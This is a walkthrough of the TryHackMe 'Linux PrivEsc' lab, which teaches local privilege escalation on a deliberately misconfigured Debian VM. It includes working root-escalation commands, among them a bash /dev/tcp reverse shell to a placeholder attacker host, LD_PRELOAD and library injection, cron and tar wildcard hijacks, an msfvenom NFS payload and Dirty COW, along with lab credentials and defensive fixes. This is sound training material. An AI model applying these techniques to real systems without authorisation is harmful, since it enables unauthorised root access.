---
title: "Linux PrivEsc"
description: "Learning room, not a CTF: an intentionally broken Debian VM that plants a different privilege-escalation flaw in nearly every task. This entry documents the techniques and the transferable lessons, from a root MySQL service and world-writable auth files to cron PATH hijacks, sudo library injection, SUID shell features, NFS root squashing and Dirty COW."
difficulty: "Learning"
tags: ["Learning Path", "Privilege Escalation", "Linux", "Sudo", "Cron", "SUID", "NFS", "Kernel Exploit", "GTFOBins"]
date: "2026-07-03"
---

> **This is a learning room, not a CTF.** There is no flag to submit and no single intended path: the Debian VM has a different privilege-escalation flaw planted in nearly every task, and each of those tasks ends with the same root shell. The badge says **Learning** for that reason, and the answers below are the room's teaching questions rather than captured flags.
>
> **Exception entry.** The local folder for this room is empty — no notes, screenshots or scan output — so this page is written from the room's published material and a public mirror of it, both linked under References. Commands are reproduced as the room presents them; I have not re-run them against the VM, and no output here is presented as my own capture. The two figures are original diagrams drawn for this page. The date reflects the folder's timestamp, since there is no completion marker to use instead.

## Overview

Linux PrivEsc is a guided lab rather than a machine you break into. You deploy a purpose-built Debian VM, log in over SSH with credentials the room publishes, and then work through twenty-one tasks. Nearly every task plants exactly one misconfiguration and asks you to reach root through it. When you are done, you exit the root shell, return to the `user` account, and start the next task from a clean position.

That structure is the point. On a normal boot2root box you find one path to root and stop; here the box is deliberately riddled with them so that you can practise the *search* — the part that actually transfers to other machines. A root MySQL daemon, a world-readable `/etc/shadow`, a passwordless `sudo` rule, a root cron job that calls a relative command, a SUID binary that loads a library from your home directory: they look unrelated, but each one is the same story told with different parts. Some privileged program treats something the low-privileged user controls as trusted input, and that input becomes code running as root.

The VM is intentionally old — Debian 6, kernel 2.6.32, bash 4.1.5, MySQL 5.1.73 — so that version-specific exploits still apply. That is worth saying plainly: several of these techniques are blocked or mitigated on a current system, but the *patterns* are not. Reading a crontab, checking `sudo -l`, and asking what a SUID binary loads are habits that outlive any particular CVE.

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Linux PrivEsc (`tryhackme.com/room/linuxprivesc`) |
| Type | Learning lab — guided, not a scored CTF |
| Level | Beginner-friendly; assumes basic Linux familiarity |
| Environment | Intentionally misconfigured Debian 6 VM (kernel 2.6.32-5-amd64, bash 4.1.5, MySQL 5.1.73) |
| Access | SSH on port 22; the room publishes `user:password321` |
| Credits | VM created by Sagi Shahar for his local privilege-escalation workshop; updated by Tib3rius |
| Goal | Root in each technique task, by a different route each time |
| Flags | None — the room asks questions instead |
| Local material | Empty folder; see the exception note above |

## How the Lab Works

Deploy the VM, connect over SSH, and confirm who you are:

```bash
ssh user@<target-ip>
id
```

The room's expected result is:

```text
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

Those group memberships are worth pausing on. `video`, `dip` and `plugdev` are not root, but group access to devices and network configuration is exactly the kind of detail that turns into a privilege escalation on a different box. Here they are decoration; the habit of reading every field of `id` is not.

The VM carries its own tooling under `/home/user/tools`: a compiled MySQL UDF, the source for the `sudo` preload libraries, the exim exploit, `libcalc.c`, a kernel-exploit suggester and a Dirty COW build, and three enumeration scripts. The room expects you to use them, not to fetch exploits from the internet, which keeps the focus on understanding what each step does.

Two pieces of lab discipline matter:

- **Reset between tasks.** After each root shell, exit back to `user`. Some tasks leave artefacts (`/tmp/rootbash`, a modified `/etc/passwd`) that would contaminate the next one, so the room explicitly tells you what to remove.
- **Read the task before acting.** Several tasks look identical from the outside — "you are root again" — but the mechanism is different, and the mechanism is the lesson.

## The Enumeration Baseline

The room's techniques are introduced one at a time, but on a real target you meet them all at once. Before any exploit, establish six facts. This is the checklist the rest of the page keeps returning to:

```bash
id
sudo -l
uname -a
cat /etc/os-release
```

`id` tells you what you already are. `sudo -l` lists every command you may run as another user, and — crucially — the `Defaults` lines that decide which environment variables survive `sudo`. `uname -a` gives the kernel version, which is the input to a CVE search. `/etc/os-release` gives the distribution and release, which tells you how old the userland is and therefore which of the techniques below are even plausible.

Then look for things that execute with someone else's identity:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

The `-perm -u+s` test matches the SUID bit; `-perm -g+s` matches SGID. The `2>/dev/null` hides the permission errors that would otherwise bury the results. Every line that comes back is a program that runs with the file owner's effective UID — usually root — and each one deserves the same question: what does it do with that power?

```bash
cat /etc/crontab
ls -l /etc/cron.d
```

System cron jobs are where "runs as root" and "runs on a timer" meet. `/etc/crontab` has a user field, so a line ending in `root overwrite.sh` is a root execution every minute. Check both the job and the script it calls: who can write the script, and how is the command resolved?

```bash
ss -tulpn
mount
cat /etc/exports
```

`ss -tulpn` shows listening services and, where permissions allow, the process that owns each socket. A service listening as root is a candidate for the MySQL-style attack below. `mount` and `/etc/exports` are the NFS angle: an exported directory with `no_root_squash` lets a root client write files that the server treats as root-owned.

![Six questions that organise Linux privilege escalation enumeration](/assets/screenshots/linuxprivesc/privesc-map.svg)

One more check is worth adding to your own methodology even though this room does not use it: `getcap -r / 2>/dev/null` lists file capabilities. A binary with `cap_setuid` can change UIDs without ever showing up in a SUID search. The room teaches SUID because it is the classic case; the enumeration habit is broader than the room.

## The Pattern Behind the Techniques

Before the individual tasks, it helps to see what they have in common. Every path in this room is a privileged execution context that can be influenced by a normal user:

![Five mechanisms that run user-influenced code as root](/assets/screenshots/linuxprivesc/root-context.svg)

The mechanism differs — `sudo`, a SUID bit, a cron job, an NFS export, a daemon — but the question you ask is always the same: *what does this root context read from a place I can write?* The answers in this room are: a script path, an environment variable, a library path, a tar argument list, a database plugin directory, a password hash file, and an SSH key. Once you start seeing the room as seven answers to that one question, the tasks stop feeling like twenty-one separate tricks.

## Part 1 — Service Exploits: A Root MySQL With No Password

The first task is a database service that has two problems at once. MySQL is running as root, and the `root` database account has no password. Either one alone would be serious; together they are a direct path to a root shell, because MySQL supports user-defined functions (UDFs) that are implemented as shared libraries loaded into the server process.

The room ships the compiled UDF, `raptor_udf2.so`, from Exploit-DB 1518. Connect to MySQL:

```bash
mysql -u root
```

Then, inside the MySQL shell:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Each statement has a job:

- `load_file()` reads the shared object into a `BLOB`. The MySQL `root` account has the `FILE` privilege, so it can read files the server can read.
- `into dumpfile` writes the bytes back out — this time into the plugin directory — without altering them. `dumpfile` is used rather than `outfile` precisely because it writes a single row verbatim.
- `create function ... soname` tells MySQL to load the library and register `do_system` as a callable function. The server uses `dlopen()` on the file in its plugin directory.
- `select do_system(...)` runs the UDF. In `raptor_udf2.c`, that function is a thin wrapper around `system()`, so the command runs in a shell that inherits the MySQL server's effective UID.

Because `mysqld` is running as root, that shell is root. The command copies `/bin/bash` to `/tmp/rootbash` and sets the SUID bit; running it with `-p` preserves the effective UID:

```bash
/tmp/rootbash -p
id
```

The lesson is not "MySQL is vulnerable". It is a stack of three bad decisions: a network service running with more privilege than it needs, an administrative account with no authentication, and a plugin directory the service can write to. Any one of them removed would break this path. On a modern MySQL the `FILE` privilege, `secure_file_priv`, and plugin-directory permissions make the same sequence much harder, but the audit questions are unchanged: *what user does this daemon run as, and what can that user write?*

## Part 2 — Weak File Permissions

The authentication files are the next family. Linux splits account data between `/etc/passwd` (world-readable, no hashes by default) and `/etc/shadow` (root-only, hashes). Each of the three tasks breaks one half of that arrangement.

### Readable /etc/shadow

```bash
ls -l /etc/shadow
cat /etc/shadow
```

The room's VM shows `-rw-r--rw-` — owner read/write, group read, other read/write — so the file is world-readable and world-writable when it should be `640 root:shadow`. The root line contains:

```text
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

The `$6$` prefix identifies SHA-512 crypt (`sha512crypt`). The string between the second and third `$` is the salt, and the rest is the hash. The room's questions — what is the hash, which algorithm, what is the password — are really one question: can you crack it offline? Yes:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
```

`sha512crypt` is deliberately slow, but "slow" only means thousands of guesses per second on a CPU core — and far more on a GPU. The room's answer is `password123`. The important property of offline cracking is that there is no lockout, no rate limit and no log entry on the target: the attacker takes the file away and works in private. A readable shadow file is therefore equivalent to handing over every weak password on the system.

The prefix is worth memorising because it tells you which cracking mode to use: `$1$` is MD5 crypt, `$5$` is SHA-256 crypt, `$6$` is SHA-512 crypt, and `$2a$`/`$2b$`/`$2y$` are bcrypt variants. Modern distributions also use `$y$` (yescrypt). Getting the prefix wrong wastes time; getting it right lets the tool do the work.

### Writable /etc/shadow

The second task is worse than the first. This time the file is writable by everyone. You do not need to crack anything; you replace root's hash with one you generated:

```bash
mkpasswd -m sha-512 'Try_H4ck#M3'
```

`mkpasswd` (from the `whois` package on Debian and Kali) prints a complete `$6$...` string. Edit `/etc/shadow`, paste it into the root entry in place of the old hash, save, and authenticate:

```bash
su - root
```

The password you chose is now root's password. `openssl passwd -6` produces the same kind of hash if `mkpasswd` is unavailable. The lesson is blunt: write access to `/etc/shadow` is root, full stop. There is no clever exploit to understand — only the question of why the file was writable in the first place.

### Writable /etc/passwd

The third variant abuses the historical layout of `/etc/passwd`. The file is normally world-readable and root-writable; here it is world-writable, so you can put a password hash in the second field yourself.

The room generates a hash with `openssl passwd`:

```bash
openssl passwd 'I_am_r00t'
```

On the room's older OpenSSL this defaults to DES crypt and prints a warning that the password is truncated to eight characters:

```text
Warning: truncating password to 8 characters
wSmjazD3HkJmU
```

The room then replaces root's `x` in `/etc/passwd` with that hash and runs `su - root`. That is the version shown in the transcript. It is worth understanding why it is fragile: on many systems PAM consults `/etc/shadow` first once an entry exists, so replacing the `x` in `/etc/passwd` is not guaranteed to take effect — the transcript's VM happened to honour it, but do not rely on that behaviour. The dependable version of this attack is the room's own alternative: append a *new* UID-0 account that has no shadow entry, so the passwd field is the only place a hash exists.

```bash
mkpasswd -m sha-512 'newpassword'
```

```text
newroot:$6$...:0:0:root:/root:/bin/bash
```

Append that line to `/etc/passwd`, then:

```bash
su - newroot
id
```

The result is `uid=0(root) gid=0(root) groups=0(root)`. The account name is irrelevant; UID 0 is what makes it root. Using `-6` rather than the default DES avoids the eight-character truncation and the weak hash.

The defensive fix for the writable-file tasks is the same: correct ownership and mode (`root:root 644` for passwd, `root:shadow 640` for shadow), file-integrity monitoring, and a configuration-management check that notices when they drift.

## Part 3 — Sudo

`sudo` is the most direct expression of the pattern: a rule says "this user may run this program as root", and the question becomes what the program can be made to do. The room's `sudo -l` output is unusually generous:

```text
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

There are eleven entries. Ten have a documented GTFOBins escape; the eleventh, `apache2`, does not — but it still runs as root and loads shared libraries. `NOPASSWD` removes even the password prompt, and the `env_keep` lines preserve `LD_PRELOAD` and `LD_LIBRARY_PATH` across the privilege transition.

### Shell escape sequences

GTFOBins is the reference for the first ten. The pattern is always the same: start the program under `sudo`, then use a feature that runs a shell or a command. Representative examples:

| Program | Escape |
|---------|--------|
| `iftop` | `sudo iftop`, then `!sh` |
| `find` | `sudo find . -exec /bin/sh \; -quit` |
| `vim` | `sudo vim -c ':!/bin/sh'` |
| `nano` | `sudo nano`, then `^R^X` and a shell command |
| `man` | `sudo man man`, then `!sh` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `less` / `more` | open a file, then `!sh` |
| `ftp` | `sudo ftp`, then `!/bin/sh` |
| `nmap` | `sudo nmap --interactive`, then `!sh` (old nmap) |

Each of these works because the program was *designed* to run commands or shell out — a pager's `!` command, an editor's `:!`, an interpreter's `system()`, nmap's old interactive mode. `sudo` gives that feature root's effective UID, and the shell it starts inherits it. The program is not broken; the sudo rule is. Granting a user an editor, a pager, an interpreter or a file manager through `sudo` is effectively granting a root shell, and GTFOBins simply documents the shortcuts.

The eleventh program, `apache2`, has no GTFOBins entry. The room uses that as a bridge to the next task: it has no shell escape, but it does load shared libraries, and the environment variables that decide *which* libraries are preserved.

### Environment variables: LD_PRELOAD and LD_LIBRARY_PATH

`env_reset` clears the environment before running a sudo command; `env_keep+=LD_PRELOAD` and `env_keep+=LD_LIBRARY_PATH` put two loader variables back. That is equivalent to granting arbitrary code execution as root, because both variables tell the dynamic loader to load code from a path the user chooses.

For `LD_PRELOAD`, the room provides `preload.c`:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/ftp
```

The library defines an `_init()` function that unsets `LD_PRELOAD`, calls `setresuid(0,0,0)` and starts `/bin/bash -p`. Compiling with `-nostartfiles` keeps `_init` as the entry point, and `_init` runs before the program's `main()`. When `sudo` starts `ftp`, the loader loads `/tmp/preload.so` into the process; by then the process is already root, so the shell it spawns is root. `id` confirms `uid=0`.

For `LD_LIBRARY_PATH`, the target is `apache2`:

```bash
ldd /usr/sbin/apache2 | grep libcrypt
```

`ldd` shows that apache2 depends on `libcrypt.so.1`. Compile the room's `library_path.c` under that exact name:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

The loader searches `LD_LIBRARY_PATH` before the system directories, finds the fake library first, and runs its constructor. The constructor unsets `LD_LIBRARY_PATH`, calls `setresuid(0,0,0)` and starts `/bin/bash -p`. Apache prints `no version information available`, which is only a warning that the substitute library has no version metadata; the shell still appears. The reason this is possible at all is subtle and worth stating: `sudo` executes the target with real and effective UID 0, so glibc does not treat it as a privilege transition and does not enter secure-execution mode. The `env_keep` lines do the rest.

The fix is to stop keeping loader variables: `env_reset` with no `env_keep` for `LD_*`, and, where a rule needs environment control, an explicit `env_delete`. On modern sudo, allowing `LD_PRELOAD` through is widely treated as equivalent to `ALL`.

## Part 4 — Cron

Cron is the cleanest place to see the pattern: a job is configured to run as root on a schedule, and the only question is whether anything it touches is writable by you.

### Writable script

```bash
cat /etc/crontab
```

Among the standard `run-parts` lines, the room's VM has two jobs that run every minute:

```text
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

The first field is minutes, then hours, day of month, month and day of week; `* * * * *` is every minute. The sixth field is the user the job runs as — `root` — and the rest is the command. Locate the script and check its mode:

```bash
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
```

The room's output is `-rwxr--rw-`, so the file is world-writable. Replace its contents with a reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

Start a listener before the next minute boundary:

```bash
nc -nvlp 4444
```

The connection arrives as `uid=0(root)`. There is no memory-corruption trick here: cron reads the script as root and executes whatever it contains, and the permissions let you change what it contains. The flaw is the mode, and the lesson is to check every file a root job touches.

### PATH hijack

The second cron task is more interesting because it does not depend on editing the real script at all — it abuses how the script's command is resolved. Look at the PATH line in `/etc/crontab`:

```text
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

The user's home directory comes first. The job calls `overwrite.sh` with no slash, so the shell searches that PATH in order and finds `/home/user/overwrite.sh` before the real `/usr/local/bin/overwrite.sh`. Create the file yourself:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```bash
chmod +x /home/user/overwrite.sh
```

Wait for cron to run it, then use the SUID shell:

```bash
/tmp/rootbash -p
```

Cron runs the job as root, the job's shell resolves `overwrite.sh` from your home directory, and your script sets the SUID bit on a copy of bash. The real script never runs.

This is a PATH hijack, and the same idea appears again in the SUID section. The defensive rule is simple: privileged jobs should call absolute paths, and their PATH should not contain user-writable directories. `/home/user` at the front of a root crontab's PATH is almost a deliberate invitation.

### Wildcard injection

The second job calls a script that uses a wildcard:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

The glob is expanded by the shell *before* `tar` runs, so every filename in `/home/user` becomes an argument. Create two files whose names are valid `tar` options:

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Transfer a reverse-shell ELF to `/home/user/shell.elf`, make it executable, and start a listener. When cron next runs, the expanded argument list contains `--checkpoint=1` and `--checkpoint-action=exec=shell.elf`; `tar` parses them as options, and the checkpoint action executes your program. The connection arrives as root.

Two details make this work. First, `--checkpoint=1` tells tar to perform a checkpoint after every record; `--checkpoint-action=exec=...` tells it what to run at each checkpoint. Second, filenames beginning with `--` are legal, so no trickery is needed to create them — though when you create them from a shell, prefix the path with `./` or use an absolute path so your own `touch` does not try to parse the name as an option.

The defensive fix is to avoid globs in privileged scripts, use `--` to end option parsing, or generate the file list explicitly (`find ... -print0 | tar --null -T -`). The underlying problem is older than tar: any program that accepts options from a filename list can be steered by whoever controls the filenames.

## Part 5 — SUID and SGID Executables

A SUID binary runs with the file owner's effective UID regardless of who executes it. That is a legitimate mechanism — `passwd` needs it to write `/etc/shadow` — but every SUID-root binary is a program that runs as root on demand. The question is always what it does with the privilege.

### Known exploits

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

Among the expected system binaries (`su`, `mount`, `passwd`, `sudo`) the room's output includes `/usr/sbin/exim-4.84-3`. That exact version corresponds to CVE-2016-1531, a local root vulnerability in Exim. The room ships the exploit:

```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

The script drops `/tmp/root.pm`, sets `PERL5LIB=/tmp`, and invokes the SUID exim. Exim preserves environment variables when it starts, and its embedded Perl interpreter loads a module from the attacker-controlled path — as root. The result is a root shell.

The transferable skill here is not the CVE number; it is the workflow: take the exact version string from the SUID listing, search Exploit-DB and the vendor advisories, and check whether a local exploit matches. Version strings matter. "Exim" is not a finding; "Exim 4.84-3 with the SUID bit" is.

### Shared object injection

The next binary, `/usr/local/bin/suid-so`, prints a progress bar. Run it under `strace` and filter for file operations:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Among the system libraries, one line stands out:

```text
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

The program tries to load a shared object from the user's home directory. That path is writable, so the missing file is an opportunity:

```bash
mkdir -p /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
```

`libcalc.c` defines a constructor that calls `setuid(0)` and `system("/bin/bash -p")`. Constructors run automatically when the library is loaded, before the program's `main()`, and because `suid-so` is SUID root the constructor runs as root. The progress bar is replaced by a root shell.

The flaw is a trust-boundary mistake: the binary loads a plugin from a location the user controls, and the SUID bit makes that plugin root code. The detection habit — `strace` a SUID binary and look for `ENOENT` opens in writable paths — is worth keeping. On modern systems, `RPATH`/`RUNPATH` handling and loader restrictions make the naive version rarer, but applications that `dlopen()` user-writable paths still exist.

### PATH inheritance

`/usr/local/bin/suid-env` looks like it starts Apache. `strings` shows why that is interesting:

```bash
strings /usr/local/bin/suid-env
```

The relevant string is `service apache2 start` — no absolute path. The program calls `system()`, which runs `/bin/sh -c "service apache2 start"`, and the shell resolves `service` using the inherited PATH. Put your own `service` earlier in the path:

```bash
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
```

The room's `service.c` calls `setuid(0)` and `system("/bin/bash -p")`. Because the parent process is SUID root, the shell it starts is root, and the `service` it resolves is your binary. `id` shows `uid=0`.

The lesson is the same as the cron PATH task, moved into a different execution context: a privileged program that resolves a command through PATH is trusting a user-controlled search order. Absolute paths in privileged code are not a style preference.

### Exported bash functions

`suid-env2` is the hardened-looking version: it calls `/usr/sbin/service` with an absolute path. On bash older than 4.2-048, that is still not enough, because bash function names may contain slashes and exported functions take precedence over external commands:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

When the SUID program starts bash, the environment contains the exported function under a name such as `BASH_FUNC_/usr/sbin/service%%`. Bash imports it, and a call to `/usr/sbin/service` invokes the function instead of the binary. The function runs `/bin/bash -p`, and `-p` tells bash to keep the effective UID rather than dropping it. The VM ships bash 4.1.5, so the technique applies.

This is a good example of why "the absolute path fixes it" is an incomplete defence. The fix depends on the shell version and on whether the environment is sanitised before the privileged program runs. Modern bash refuses to import functions with slashes in the name, and modern privilege boundaries clear the function environment — but only if the version is current.

### PS4 and xtrace

The final SUID variant also depends on a bash version. Check it:

```bash
/bin/bash --version
```

The room's VM reports `GNU bash, version 4.1.5(1)-release`. When bash runs with xtrace enabled, it prints each command before executing it, and the prefix it prints is the value of `PS4`. Before bash 4.4, command substitution inside `PS4` is executed by the tracing shell. That shell is running as root:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```

`env -i` starts with an empty environment, then sets `SHELLOPTS=xtrace` (enabling tracing at shell startup) and `PS4` to the payload. When the SUID program hands its command to bash, bash traces it, expands `PS4`, executes the command substitution as root, and continues. The result is an SUID copy of bash waiting at `/tmp/rootbash`.

This one is worth filing under "the environment is input". The payload is not in the program, the arguments or the filesystem; it is in a variable that the program's shell reads. It also shows why version checks belong in enumeration: the same technique would fail on bash 4.4 and later.

## Part 6 — Passwords and Keys

Not every privilege escalation is a code-execution flaw. Often the credential is simply lying somewhere readable, and the room has three examples.

### History files

```bash
cat ~/.*history
```

The room's history contains:

```bash
mysql -h somehost.local -uroot -ppassword123
```

The password is attached to `-p` with no space, which is the syntax MySQL requires for an inline password — with a space, the next argument would be read as a database name. It offers no protection: the value is visible in the process list and, as here, preserved in the history file. Shell history is a credential store written by the user, readable by the user, and frequently readable by anyone who can read the home directory. This particular history is also a map of the machine: `ls -al`, `ifconfig`, `netstat -antp`, the `strace` run and the `gcc` commands show exactly what the previous user was doing. The room then has you authenticate as root with the recovered password.

The habit is to read `~/.bash_history`, `~/.zsh_history`, `~/.mysql_history` and friends early. The defensive answer is to avoid passwords on command lines (use a client configuration file with tight permissions or an agent), and to set `HISTCONTROL`/`HISTIGNORE` where appropriate — though neither is a substitute for not putting secrets in the history in the first place.

### Config files

The user's home directory contains `myvpn.ovpn`. Reading it reveals:

```text
auth-user-pass /etc/openvpn/auth.txt
```

That file contains the root credentials:

```text
root
password123
```

The indirection is the interesting part. The VPN profile does not contain the password; it points at a file that does. An attacker who reads the profile learns exactly where to look, and the permissions on the credential file are what actually matter. Check both the configuration and the file it references, and check whether either is readable by the account you have.

### SSH keys

A world-readable root private key is the same story with a different artefact:

```bash
ls -la /
ls -l /.ssh/
```

The listing shows `/.ssh/root_key` as `-rw-r--r--`, world-readable. Copy it, fix the permissions, and use it:

```bash
scp user@<target-ip>:/.ssh/root_key .
chmod 600 root_key
ssh -i root_key root@<target-ip>
```

SSH refuses to use a key with loose permissions, which is why `chmod 600` is required on the copy; `600` is the client-side check, not the server's. The `load pubkey ... invalid format` warning in the room's transcript is non-fatal — the key still authenticates — and is a reminder that a warning is not always an error. The login lands as `uid=0(root)`, assuming root's `authorized_keys` trusts this key, which in the lab it does.

The defensive point: a private key is a password that does not expire until it is rotated. Store it at `600`, keep it out of world-readable backup paths, and rotate it if it was ever exposed.

## Part 7 — NFS and no_root_squash

NFS exports add a server-side identity rule that is easy to overlook. By default, root on the client is *squashed*: the server maps UID 0 to the unprivileged `nobody` account, so a root client cannot create root-owned files on the export. `no_root_squash` disables that mapping. The room's `/etc/exports` is:

```text
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

That single option turns the share into a privilege-escalation primitive. On the attack box, as root:

```bash
mkdir /tmp/nfs
mount -o rw,vers=2 <target-ip>:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```

Then, on the target as the low-privileged user:

```bash
/tmp/shell.elf
```

The result is `euid=0(root)`. Because the client's root is not squashed, the file is created as `root:root` with the SUID bit intact, and the target's kernel honours that bit when the user executes it. The export is on `/tmp`, so the file is immediately reachable.

The `vers=2` in the room's command reflects the age of the VM; modern clients may need `vers=3` or `vers=4`, and older servers may need `-o nolock`. The principle is unchanged: if you can mount the share as root and the server preserves your ownership and mode bits, you can plant a root-owned SUID binary.

The defensive fix is to leave root squashing enabled, restrict exports to specific hosts, and use `nosuid` on clients that do not need SUID binaries from the share. The room's question — which option disables root squashing — has a one-word answer, `no_root_squash`, but the consequence is the whole attack.

## Part 8 — Kernel Exploits

When the configuration paths are exhausted, the kernel itself is the remaining surface. The room is explicit that this is a last resort: a failed kernel exploit can panic the machine, and the exploit is tied to a version and a build.

The VM ships Linux Exploit Suggester 2:

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

It reports kernel 2.6.32 and lists Dirty COW (CVE-2016-5195) among the candidates. The room also ships the exploit, `c0w.c`:

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
/usr/bin/passwd
```

Dirty COW is a race in the kernel's copy-on-write handling that lets a process write to a read-only private mapping. `c0w.c` uses that write primitive to replace `/usr/bin/passwd` — a SUID-root binary — with a small program that spawns a shell. It backs up the original to `/tmp/bak`. Running `/usr/bin/passwd` then executes the replacement with euid 0 and produces a root shell.

Restore the binary afterwards:

```bash
mv /tmp/bak /usr/bin/passwd
```

The reason to put kernel exploits last is not only stability. They are the least portable and the most likely to be fixed; the configuration flaws in the earlier parts are usually still present on a patched kernel. Enumeration should reach the kernel version early, but exploitation should prefer the cheaper, more reliable paths.

## Part 9 — Automation: LinEnum, LinPEAS and LSE

The room ends with three enumeration scripts in `/home/user/tools/privesc-scripts`:

```bash
./linenum.sh -t
./linpeas.sh -a
./lse.sh -l 2
```

They overlap heavily. LinEnum prints users, groups, sudo rules, cron jobs, SUID files, writable files and kernel information in a readable report. LinPEAS does much the same with more colour and more checks, including capabilities, container hints, and interesting files. LSE is organised by "levels" of findings so you can start with the highest-signal results and drill down.

The room's closing question is a good one: do all three identify the techniques used here? The honest answer is that they identify the *raw material* — the SUID binaries, the sudo entries, the cron jobs, the writable files, the kernel version — but not always the exploitability. A tool can tell you that `/usr/sbin/apache2` is in the sudo rules; it rarely connects that rule to the missing GTFOBins entry and the preserved `LD_LIBRARY_PATH`. It can tell you a cron job exists; it cannot decide that the job's PATH begins with a user-writable directory and that the script name is relative. Those conclusions require reading the output with the pattern from this room in mind.

Use the scripts as an index, then verify each lead by hand. The best workflow is: run one comprehensive scanner, read its "interesting" section, and then use the six questions from the enumeration baseline to decide which leads are real. Automation shortens the search; it does not replace the reasoning.

## Room Answers

These are the room's teaching answers, reproduced for study. They are environment-specific and are not flags.

| Task | Question | Answer |
|------|----------|--------|
| 1 | `id` as `user` | `uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)` |
| 3 | Root password hash | The `$6$Tb/euwmK$...` string shown above |
| 3 | Hashing algorithm | `sha512crypt` |
| 3 | Root password | `password123` |
| 5 | `id` as `newroot` | `uid=0(root) gid=0(root) groups=0(root)` |
| 6 | Programs allowed via sudo | `11` |
| 6 | Program with no GTFOBins shell escape | `apache2` |
| 9 | PATH in `/etc/crontab` | `/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin` |
| 16 | Full mysql command in history | `mysql -h somehost.local -uroot -ppassword123` |
| 17 | File containing root credentials | `/etc/openvpn/auth.txt` |
| 19 | Option that disables root squashing | `no_root_squash` |
| 21 | The three scripts | LinEnum, LinPEAS, Linux Smart Enumeration (LSE) |

## Commands Used

| Purpose | Command |
|---------|---------|
| Connect to the lab | `ssh user@<target-ip>` |
| Identity and groups | `id` |
| Sudo rules and kept environment | `sudo -l` |
| Kernel and distribution | `uname -a`; `cat /etc/os-release` |
| Find SUID/SGID files | `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null` |
| Read the system crontab | `cat /etc/crontab` |
| List listening services | `ss -tulpn` |
| List NFS exports | `cat /etc/exports` |
| Enter MySQL as root | `mysql -u root` |
| Load a MySQL UDF | `create function do_system returns integer soname 'raptor_udf2.so';` |
| Generate a SHA-512 crypt hash | `mkpasswd -m sha-512 '<password>'` |
| Generate a hash with OpenSSL | `openssl passwd -6 '<password>'` |
| Crack a `$6$` hash | `john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt`; `hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt` |
| Read shell history | `cat ~/.*history` |
| Inspect a binary's strings | `strings /usr/local/bin/suid-env` |
| Trace file opens | `strace /usr/local/bin/suid-so 2>&1 \| grep -iE "open\|access\|no such file"` |
| Compile a preload library | `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c` |
| Compile a shared object | `gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c` |
